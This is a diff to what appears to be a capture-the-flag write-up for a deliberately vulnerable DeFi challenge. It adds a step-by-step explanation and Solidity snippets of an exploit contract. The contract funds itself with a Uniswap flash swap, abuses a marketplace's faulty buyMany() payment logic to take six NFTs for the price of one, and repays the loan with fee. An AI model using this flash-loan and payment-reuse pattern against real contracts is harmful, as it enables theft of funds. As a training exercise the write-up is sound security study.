@@ -259,7 +259,7 @@ contract AttackFreeRider{
         for(uint i=0; i<5; i++){
             nft.safeTransferFrom(address(this), recovery, tokenIds[i],hex'');
         }
-            nft.safeTransferFrom(address(this), recovery, 5, abi.encode(tx.origin));
+        nft.safeTransferFrom(address(this), recovery, 5, abi.encode(tx.origin));
 
     }
 
@@ -274,6 +274,71 @@ contract AttackFreeRider{
 
         receive() external payable {}
 
+}
+```
+
+Get the instances of contracts in the constructor.
+
+```solidity
+ constructor(address _weth, address _nft, address _uniswap, address payable _marketplace, address _recovery){
+        weth = IWETH(_weth);
+        nft = IERC721(_nft);
+        uniswap = IUniswapV2Pair(_uniswap);
+        marketplace = FreeRiderNFTMarketplace(_marketplace);
+        recovery = _recovery;
+}
+```
+
+In the `attack()` function, we will do flash swap to get WETH. Therefore, we must send at least 0.045135406218655967 ETH to pay the fee for the 15 WETH flash swap.
+
+```solidity
+function attack()external payable{
+        uniswap.swap(15 ether, 0, address(this), hex'01');
+}
+```
+
+In the `uniswapV2Call()` callback function for the flash swap, first, unwrap the flash swapped WETH to use for buying NFTs with the `withdraw()`. And then, we will expoit the faulty `buyMany()` logic to acquire all NFTs for free. Each NFT in the marketplace costs 15 ETH, so we will “just” pay 15 ETH to get all 6 NFT instead of paying 90. What a steal!
+
+```solidity
+weth.withdraw(_amount);
+marketplace.buyMany{value: _amount}(tokenIds);
+```
+
+`Computing fee :` Uniswap charges 0.3% for any form of swap. Using the following code, we are computing the fee that our contract will have to bear for undertaking the flashswap.
+
+```solidity
+uint fee = ((_amount * 3) / 997) + 1;
+uint amountToRepay = _amount + fee;
+```
+
+`Repayment :` We have to pay Uniswap the borrowed token including the fee. So, we will pay back the flash swap by using the following code.
+
+
+```solidity
+weth.deposit{value: amountToRepay}();
+weth.transfer(address(uniswap), amountToRepay);
+```
+
+Finally, we will send NFTs to the `recovery` address. On final NFT transfer, recover pays out to the address passed to the data argument.
+
+```solidity
+for(uint i=0; i<5; i++){
+    nft.safeTransferFrom(address(this), recovery, tokenIds[i],hex'');
+}
+ nft.safeTransferFrom(address(this), recovery, 5, abi.encode(tx.origin));
+```
+
+
+At the end of the code, we have `onERC721Received()` callback function for ERC-721 safeTransferFrom. It returns `0x150b7a02` which is equal to `bytes4(keccak256("onERC721Received(address,address,uint256,bytes)"))`.
+
+```solidity
+ function onERC721Received(
+        address operator,
+        address from,
+        uint256 tokenId,
+        bytes calldata data
+    ) external returns (bytes4){
+        return 0x150b7a02;
 }
 ```
 
